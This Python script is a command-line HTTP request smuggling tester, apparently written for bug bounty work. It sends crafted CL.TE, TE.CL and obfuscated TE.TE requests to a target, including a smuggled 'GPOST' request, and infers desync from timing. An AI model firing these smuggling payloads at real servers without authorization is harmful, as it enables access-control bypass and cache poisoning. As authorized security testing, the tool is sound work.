#!/usr/bin/env python3

import socket
import ssl
import argparse
from urllib.parse import urlparse
import time

class HTTPSmugglingTester:
    def __init__(self, target_url, timeout=10, delay=1, verbose=False):
        self.target_url = target_url
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        
        # Parse URL properly
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
            self.target_url = target_url
        
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.hostname or self.parsed_url.netloc
        self.path = self.parsed_url.path or '/'
        self.use_ssl = self.parsed_url.scheme == 'https'
        self.port = self.parsed_url.port or (443 if self.use_ssl else 80)
        
        if self.verbose:
            print(f"[DEBUG] Parsed URL:")
            print(f"  Host: {self.host}")
            print(f"  Port: {self.port}")
            print(f"  Path: {self.path}")
            print(f"  SSL: {self.use_ssl}")
        
    def send_request(self, request_data, test_name=""):
        """Send raw HTTP request and return response with timing"""
        if self.verbose:
            print(f"\n--- Request Sent ({test_name}) ---")
            print(request_data)
            print("--- End of Request ---\n")
        
        try:
            start_time = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            if self.use_ssl:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.connect((self.host, self.port))
            sock.sendall(request_data.encode())
            
            response = b''
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            
            sock.close()
            elapsed_time = time.time() - start_time
            
            decoded_response = response.decode('utf-8', errors='ignore')
            
            if self.verbose:
                print(f"--- Response Received ({elapsed_time:.2f}s) ---")
                print(decoded_response[:500] if len(decoded_response) > 500 else decoded_response)
                if len(decoded_response) > 500:
                    print(f"... (truncated, total length: {len(decoded_response)} chars)")
                print("--- End of Response ---\n")
            
            return decoded_response, elapsed_time
        except Exception as e:
            elapsed_time = time.time() - start_time
            error_msg = f"Error: {str(e)}"
            
            if self.verbose:
                print(f"--- Error Occurred ({elapsed_time:.2f}s) ---")
                print(error_msg)
                print("--- End of Error ---\n")
            
            return error_msg, elapsed_time
    
    def get_status_code(self, response):
        """Extract HTTP status code from response"""
        try:
            status_line = response.split('\n')[0]
            parts = status_line.split()
            if len(parts) >= 2:
                return parts[1]
        except:
            pass
        return None
    
    def is_vulnerable_response(self, response, elapsed, baseline_status):
        """
        Determine if a response indicates a vulnerability.
        
        Key insight: HTTP smuggling vulnerabilities cause TIMING issues or CONNECTION hangs,
        not just error responses. A 400 error that comes back quickly is the server
        correctly rejecting a malformed request, not a desync.
        """
        timing_suspicious = elapsed > (self.timeout * 0.8)
        status_code = self.get_status_code(response)
        
        # True vulnerability indicators:
        # 1. Timing anomaly (server hanging/waiting for more data)
        if timing_suspicious:
            return True, "Timing anomaly detected - server may be waiting for smuggled request"
        
        # 2. Connection timeout or error
        if "timeout" in response.lower() or "Error:" in response:
            return True, "Connection timeout or error suggests desync"
        
        # 3. Status code is 200 when it should fail (accepting malformed request)
        if status_code == '200' and baseline_status == '200':
            # This could indicate the server is accepting the malformed request
            # But we need to check if the response is different
            return False, "Server accepted request but this alone doesn't indicate vulnerability"
        
        # 4. Fast 400 errors are NOT vulnerabilities - server is correctly rejecting bad requests
        if status_code == '400' and elapsed < (self.timeout * 0.5):
            return False, "Server correctly rejected malformed request (not vulnerable)"
        
        # 5. Any other status change with normal timing
        if status_code and status_code != baseline_status:
            # Status changed but no timing issue - likely just proper error handling
            return False, f"Status changed to {status_code} but no desync indicators"
        
        return False, "Normal response with no vulnerability indicators"
    
    def explain_vulnerability(self, vuln_type, detected=True):
        """Explain why a vulnerability was or wasn't detected"""
        explanations = {
            'CL.TE': {
                'description': '''
CL.TE (Content-Length vs Transfer-Encoding) Desynchronization:
---------------------------------------------------------------
This occurs when the front-end server uses the Content-Length header
while the back-end server uses the Transfer-Encoding header.

How it works:
1. Front-end reads Content-Length: 6 bytes ("0\\r\\n\\r\\nG")
2. Back-end uses Transfer-Encoding: chunked, reads "0\\r\\n\\r\\n" (valid chunk)
3. The "G" remains in the buffer and poisons the next request

Exploitation impact:
- Request smuggling to bypass security controls
- Cache poisoning
- Session hijacking
- Request routing manipulation

Key vulnerability indicator: TIMING delays, not just error codes!
                ''',
                'detected_reason': '''
Possible vulnerability detected because:
- Timing anomaly: Response took significantly longer than expected
- OR Connection timeout: Server waiting for more data (classic desync symptom)
- This suggests front-end and back-end are parsing the request differently
                ''',
                'not_detected_reason': '''
No vulnerability detected because:
- Server handled the request consistently
- Response time was normal (no hanging/waiting)
- Any errors returned were immediate (proper request rejection)
- No evidence of request desynchronization
                '''
            },
            'TE.CL': {
                'description': '''
TE.CL (Transfer-Encoding vs Content-Length) Desynchronization:
---------------------------------------------------------------
This occurs when the front-end server uses Transfer-Encoding while
the back-end server uses the Content-Length header.

How it works:
1. Front-end reads Transfer-Encoding: chunked, processes entire chunked body
2. Back-end uses Content-Length: 4, reads only 4 bytes
3. Remaining data ("GPOST / HTTP/1.1...") is treated as start of next request

Exploitation impact:
- Complete request smuggling (inject full HTTP request)
- Bypass authentication and authorization
- Access control circumvention
- Web cache poisoning

Key vulnerability indicator: Server ACCEPTS smuggled request or HANGS!
                ''',
                'detected_reason': '''
Possible vulnerability detected because:
- Timing anomaly suggests back-end processing smuggled "GPOST" request
- OR Connection hang indicates desynchronization
- Server behavior differs significantly from baseline
                ''',
                'not_detected_reason': '''
No vulnerability detected because:
- Both front-end and back-end parsed headers consistently
- No timing anomalies or connection issues
- Server properly handled or rejected the request
- No evidence of smuggled request being processed
                '''
            },
            'TE.TE': {
                'description': '''
TE.TE (Transfer-Encoding Obfuscation) Desynchronization:
---------------------------------------------------------
This occurs when both servers support Transfer-Encoding but one can be
induced to ignore it through obfuscation techniques.

Obfuscation techniques tested:
1. Multiple Transfer-Encoding headers
2. Case variation (Transfer-encoding vs Transfer-Encoding)
3. Invalid Transfer-Encoding values
4. Whitespace manipulation (Transfer-Encoding : chunked)

How it works:
1. Front-end processes one version of Transfer-Encoding
2. Back-end ignores obfuscated header, falls back to Content-Length
3. Desynchronization occurs similar to TE.CL

Exploitation impact:
- Same as TE.CL vulnerability
- Often harder to detect and patch
- May bypass WAF rules

Note: A 400 error is NOT a vulnerability - it means the server correctly
rejected the malformed header!
                ''',
                'detected_reason': '''
Possible vulnerability detected because:
- Timing anomaly with specific header obfuscation
- Server hang or connection timeout
- Different behavior between front-end/back-end with obfuscated headers
                ''',
                'not_detected_reason': '''
No vulnerability detected because:
- All obfuscation attempts were handled consistently
- Server properly rejected malformed headers (400 errors are GOOD)
- No timing anomalies or desynchronization detected
- Both servers normalized headers the same way
                '''
            }
        }
        
        if vuln_type in explanations:
            print(explanations[vuln_type]['description'])
            if detected:
                print(explanations[vuln_type]['detected_reason'])
            else:
                print(explanations[vuln_type]['not_detected_reason'])
    
    def test_cl_te(self, baseline_status):
        """Test for CL.TE (Content-Length vs Transfer-Encoding) desync"""
        print("\n[*] Testing CL.TE vulnerability...")
        
        if self.verbose:
            print("\n[INFO] CL.TE Test Explanation:")
            print("Sending a request with both Content-Length (6) and Transfer-Encoding (chunked).")
            print("If front-end uses CL and back-end uses TE, the 'G' will poison next request.")
            print("A true vulnerability will cause TIMING delays, not just error responses.")
        
        # Crafted request with both CL and TE headers
        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        )
        
        response, elapsed = self.send_request(request, "CL.TE Test")
        
        status_code = self.get_status_code(response)
        
        print(f"    Response time: {elapsed:.2f}s")
        print(f"    Response status: {status_code}")
        
        vulnerable, reason = self.is_vulnerable_response(response, elapsed, baseline_status)
        
        if self.verbose:
            print(f"    Analysis: {reason}")
        
        if vulnerable:
            print("[+] Possible CL.TE vulnerability detected!")
            print(f"    Reason: {reason}")
            print(f"    Response snippet: {response[:200]}")
            if self.verbose:
                self.explain_vulnerability('CL.TE', detected=True)
        else:
            print("[-] No CL.TE vulnerability detected")
            if not self.verbose:
                print(f"    Reason: {reason}")
            if self.verbose:
                self.explain_vulnerability('CL.TE', detected=False)
        
        return vulnerable
    
    def test_te_cl(self, baseline_status):
        """Test for TE.CL (Transfer-Encoding vs Content-Length) desync"""
        print("\n[*] Testing TE.CL vulnerability...")
        
        if self.verbose:
            print("\n[INFO] TE.CL Test Explanation:")
            print("Sending chunked request where front-end processes full chunk,")
            print("but back-end only reads Content-Length: 4 bytes.")
            print("Remaining data should be treated as a new request if vulnerable.")
            print("Look for timing delays or connection hangs!")
        
        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        response, elapsed = self.send_request(request, "TE.CL Test")
        
        status_code = self.get_status_code(response)
        
        print(f"    Response time: {elapsed:.2f}s")
        print(f"    Response status: {status_code}")
        
        vulnerable, reason = self.is_vulnerable_response(response, elapsed, baseline_status)
        
        if self.verbose:
            print(f"    Analysis: {reason}")
        
        if vulnerable:
            print("[+] Possible TE.CL vulnerability detected!")
            print(f"    Reason: {reason}")
            print(f"    Response snippet: {response[:200]}")
            if self.verbose:
                self.explain_vulnerability('TE.CL', detected=True)
        else:
            print("[-] No TE.CL vulnerability detected")
            if not self.verbose:
                print(f"    Reason: {reason}")
            if self.verbose:
                self.explain_vulnerability('TE.CL', detected=False)
        
        return vulnerable
    
    def test_te_te(self, baseline_status):
        """Test for TE.TE (obfuscated Transfer-Encoding) desync"""
        print("\n[*] Testing TE.TE vulnerability (obfuscated header)...")
        
        if self.verbose:
            print("\n[INFO] TE.TE Test Explanation:")
            print("Testing various Transfer-Encoding header obfuscations to see if")
            print("front-end and back-end handle them differently.")
            print("NOTE: 400 errors mean the server is CORRECTLY rejecting bad headers!")
        
        # Try various obfuscations
        obfuscations = [
            ("Transfer-Encoding: chunked\r\nTransfer-Encoding: identity", "Duplicate headers with conflicting values"),
            ("Transfer-Encoding: chunked\r\nTransfer-encoding: chunked", "Case variation (lowercase 'e')"),
            ("Transfer-Encoding: chunked\r\nTransfer-Encoding: x", "Invalid second TE header"),
            ("Transfer-Encoding : chunked", "Space before colon"),
        ]
        
        for i, (obf, description) in enumerate(obfuscations):
            if i > 0:
                if self.verbose:
                    print(f"\n    Waiting {self.delay}s before next test...")
                time.sleep(self.delay)
            
            print(f"\n    Testing obfuscation {i+1}/{len(obfuscations)}: {description}")
            
            if self.verbose:
                print(f"    Header: {obf}")
            
            request = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"{obf}\r\n"
                f"Content-Length: 4\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 15\r\n"
                f"\r\n"
                f"x=1\r\n"
                f"0\r\n"
                f"\r\n"
            )
            
            response, elapsed = self.send_request(request, f"TE.TE Test - {description}")
            
            status_code = self.get_status_code(response)
            
            print(f"    Response time: {elapsed:.2f}s")
            print(f"    Response status: {status_code}")
            
            vulnerable, reason = self.is_vulnerable_response(response, elapsed, baseline_status)
            
            if self.verbose:
                print(f"    Analysis: {reason}")
            
            if vulnerable:
                print(f"[+] Possible TE.TE vulnerability with: {description}")
                print(f"    Reason: {reason}")
                if self.verbose:
                    self.explain_vulnerability('TE.TE', detected=True)
                return True
        
        print("\n[-] No TE.TE vulnerability detected")
        if self.verbose:
            self.explain_vulnerability('TE.TE', detected=False)
        
        return False
    
    def test_baseline(self):
        """Send normal request to establish baseline"""
        print("\n[*] Sending baseline request...")
        
        if self.verbose:
            print("[INFO] Establishing baseline with normal GET request")
        
        request = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        
        response, elapsed = self.send_request(request, "Baseline")
        status = self.get_status_code(response) or 'Unknown'
        print(f"[*] Baseline response status: {status}")
        print(f"[*] Baseline response time: {elapsed:.2f}s")
        
        if self.verbose:
            print(f"[INFO] This establishes normal server behavior for comparison")
        
        return status
        
    def run_all_tests(self):
        """Run all HTTP smuggling tests"""
        print(f"\n{'='*60}")
        print(f"HTTP Request Smuggling Tester")
        print(f"Target: {self.target_url}")
        print(f"Timeout: {self.timeout}s | Delay between tests: {self.delay}s")
        print(f"Verbose mode: {'ON' if self.verbose else 'OFF'}")
        print(f"{'='*60}")
        
        baseline_status = self.test_baseline()
        
        if baseline_status == '400':
            print(f"\n[WARNING] Baseline request returned 400 Bad Request")
            print(f"[WARNING] This might indicate URL parsing issues or server configuration")
            print(f"[INFO] Continuing tests, but results may show false positives")
        
        print(f"\n[*] Waiting {self.delay}s before starting vulnerability tests...")
        time.sleep(self.delay)
        
        results = {}
        
        # CL.TE Test
        results['CL.TE'] = self.test_cl_te(baseline_status)
        time.sleep(self.delay)
        
        # TE.CL Test
        results['TE.CL'] = self.test_te_cl(baseline_status)
        time.sleep(self.delay)
        
        # TE.TE Test
        results['TE.TE'] = self.test_te_te(baseline_status)
        
        print(f"\n{'='*60}")
        print("Summary:")
        print(f"{'='*60}")
        
        vulnerabilities_found = sum(results.values())
        
        for test, result in results.items():
            status = "VULNERABLE" if result else "Not Vulnerable"
            print(f"{test}: {status}")
        
        if vulnerabilities_found > 0:
            print(f"\n[!] {vulnerabilities_found} potential vulnerability/vulnerabilities detected!")
            print("[!] Further manual testing recommended")
            print("[!] Document findings with request/response details for bug bounty report")
            
            if self.verbose:
                print("\n[INFO] Next Steps:")
                print("1. Verify findings manually with tools like Burp Suite")
                print("2. Test with actual smuggled requests to confirm exploitability")
                print("3. Document the full attack chain")
                print("4. Check for additional vulnerable endpoints")
                print("5. Determine business impact for severity rating")
        else:
            print("\n[+] No HTTP smuggling vulnerabilities detected")
            print("[*] Server appears to handle conflicting headers securely")
            
            if self.verbose:
                print("\n[INFO] What this means:")
                print("- Server correctly rejects malformed requests (400 errors are good!)")
                print("- No timing anomalies suggesting desynchronization")
                print("- Front-end and back-end appear to parse headers consistently")
                print("\n[INFO] Additional testing recommendations:")
                print("- Test different endpoints and HTTP methods")
                print("- Test with authenticated requests")
                print("- Check for edge cases with specific content types")
                print("- Consider testing with a reverse proxy in place")

def main():
    parser = argparse.ArgumentParser(
        description='HTTP Request Smuggling Vulnerability Tester for Bug Bounties',
        epilog='IMPORTANT: Only use on systems you have explicit authorization to test!',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('url', help='Target URL (e.g., https://example.com or 192.168.1.1)')
    parser.add_argument('-t', '--timeout', type=int, default=10, 
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-d', '--delay', type=int, default=1,
                       help='Delay between tests in seconds (default: 1)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Show detailed output including requests/responses and explanations')
    
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("WARNING: Only use this tool on systems you are authorized to test!")
    print("Unauthorized testing may be illegal.")
    print("="*60 + "\n")
    
    tester = HTTPSmugglingTester(
        args.url, 
        timeout=args.timeout, 
        delay=args.delay,
        verbose=args.verbose
    )
    tester.run_all_tests()

if __name__ == "__main__":
    main()
